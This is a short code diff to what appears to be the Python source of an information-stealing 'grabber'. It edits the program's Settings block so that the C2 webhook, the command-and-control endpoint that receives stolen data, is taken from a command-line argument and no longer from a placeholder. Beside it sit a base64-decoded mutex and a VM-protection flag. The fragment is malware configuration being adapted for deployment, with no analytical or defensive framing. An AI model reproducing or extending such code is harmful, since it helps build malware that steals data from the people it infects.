@@ -21,7 +21,7 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, "YOUR_WEBHOOK_H4R4")
+    C2 = (0, sys.argv[1])
     Mutex = base64.b64decode('UHp3YU5xOWtIYjB1RmdoaA==').decode()
     PingMe = bool('')
     Vmprotect = bool('true')
